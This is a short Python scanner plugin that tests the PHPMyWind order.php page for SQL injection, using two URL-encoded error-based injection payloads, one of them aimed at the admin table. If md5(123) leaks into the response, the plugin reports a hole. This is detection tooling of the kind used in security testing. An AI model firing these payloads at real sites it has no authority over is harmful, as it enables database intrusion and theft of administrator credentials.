#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = Tian.Te
def assign(service,arg):
    if service == "phpmywind":
        return True, arg

def audit(arg):
    payloads = (
                'order.php?id=-@`%27`%20UnIon%20select%20username%20from%20`%23@__admin`%20where%20(select%201%20from%20(select%20count(*)%20,concat((select%20concat(0x7167766571,0x7c,md5(123),0x3a73706c69743a,md5(123),0x7c,0x716b616771)),0x7c,floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x%20limit%200,1)a)%20and%20id=@`%27`',
                'order.php?id=-%40%60%27%60%20AND%20%28SELECT%202598%20FROM%28SELECT%20COUNT%28%2A%29%2CCONCAT%280x7167766571%2C%28SELECT%20MID%28%28IFNULL%28CAST%28concat(0x7c,md5(123)%2C0x3a73706c69743a%2Cmd5(123),0x7c)%20AS%20CHAR%29%2C0x20%29%29%2C1%2C50%29%29%2C0x716b616771%2CFLOOR%28RAND%280%29%2A2%29%29x%20FROM%20INFORMATION_SCHEMA.CHARACTER_SETS%20GROUP%20BY%20x%29a%29and%20id%3D%40%60%27%60'
                )
    for payload in payloads:
        target = arg + payload
        cookie = "shoppingcart=a,username=a"
        code, head, res,errcode,_ = curl.curl('-b "%s" "%s"' % (cookie,target
                                                                ))
        if code == 200 and "202cb962ac59075b964b07152d234b70"in res:
            string = getString(res)
            security_hole(target)

def getString(string):
    import re
    Regular = "Duplicate entry \'qgveq\|(.+):split:([a-fA-F0-9]{32})\|qkagq"
    Temp = re.search(Regular,string)
    if Temp != None:
        Temp = Temp.group(0)
        return Temp
    else:
        return ""

if __name__ == "__main__":
    from dummy import *
    audit(assign('phpmywind', 'http://www.example.com/')[1])
